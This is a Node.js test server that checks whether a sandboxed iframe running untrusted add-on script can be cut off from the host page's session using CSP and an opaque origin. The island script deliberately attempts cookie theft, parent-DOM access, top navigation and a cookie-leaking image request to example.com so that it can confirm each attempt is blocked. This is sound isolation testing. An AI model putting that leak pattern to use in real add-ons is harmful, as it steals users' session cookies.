// Spike: can an add-on "island" on the SAME host/port be isolated from the
// board's session? Uses only browser sandboxing (opaque origin) + CSP.
import { createServer } from "node:http";

const PORT = 8090;
const page = `<!doctype html><meta charset="utf-8"><title>board</title>
<h1>Board page</h1>
<p>Session cookie set: <code id="c"></code></p>
<iframe id="island" src="/x/demo/island" sandbox="allow-scripts" style="width:100%;height:320px;border:1px solid #999"></iframe>
<pre id="bridge"></pre>
<script>
  document.getElementById('c').textContent = document.cookie;
  // the bridge: the only channel the island has
  addEventListener('message', (e) => {
    document.getElementById('bridge').textContent += 'bridge got from origin "' + e.origin + '": ' + JSON.stringify(e.data) + '\\n';
    e.source.postMessage({ reply: 'viewer:u1 (only what the bridge chooses to share)' }, '*');
  });
</script>`;

const island = `<!doctype html><meta charset="utf-8">
<body style="font:13px monospace"><b>Island (untrusted add-on JS)</b><pre id="out"></pre>
<script>
  const out = (k, v) => document.getElementById('out').textContent += k + ': ' + v + '\\n';
  const results = {};
  const t = (k, f) => { try { results[k] = String(f()); } catch (e) { results[k] = 'BLOCKED (' + e.name + ')'; } out(k, results[k]); };
  t('origin', () => self.origin);
  t('document.cookie', () => document.cookie);
  t('localStorage', () => localStorage.length);
  t('parent DOM', () => parent.document.title);
  if (self !== top) t('top navigation', () => { top.location.href = '/pwned'; return 'navigated?'; });
  parent.postMessage({ stage: 'script started' }, '*');
  fetch('/api/me', { credentials: 'include' })
    .then(r => r.text()).then(x => out('fetch /api/me', x)).catch(e => out('fetch /api/me', 'BLOCKED (' + e.name + ')'))
    .finally(() => {
      const img = new Image(); img.onload = () => out('external image', 'loaded'); img.onerror = () => out('external image', 'BLOCKED');
      img.src = 'https://example.com/favicon.ico?leak=' + encodeURIComponent(results['document.cookie']);
      parent.postMessage({ hello: 'from island', results }, '*');
    });
  addEventListener('message', (e) => out('bridge reply', JSON.stringify(e.data)));
</script>`;

createServer((req, res) => {
  console.log(req.method, req.url, 'cookie=' + (req.headers.cookie ?? '-'), 'origin=' + (req.headers.origin ?? '-'), 'sec-fetch-site=' + (req.headers['sec-fetch-site'] ?? '-'));
  if (req.url === "/") {
    res.writeHead(200, { "content-type": "text/html", "set-cookie": "osbb_session=SECRET123; Path=/; SameSite=Lax" });
    return res.end(page);
  }
  if (req.url === "/x/demo/island") {
    res.writeHead(200, {
      "content-type": "text/html",
      // Enforced even if the island URL is opened directly (not framed):
      "content-security-policy": "sandbox allow-scripts; default-src 'none'; script-src 'unsafe-inline'; style-src 'unsafe-inline'; connect-src 'none'; img-src 'self'",
    });
    return res.end(island);
  }
  if (req.url === "/api/me") {
    const cookie = req.headers.cookie ?? "(none)";
    res.writeHead(200, { "content-type": "text/plain" });
    return res.end(`server saw cookie: ${cookie}; origin header: ${req.headers.origin ?? "(none)"}`);
  }
  res.writeHead(404).end("not found");
}).listen(PORT, () => console.log(`island spike on http://localhost:${PORT}`));
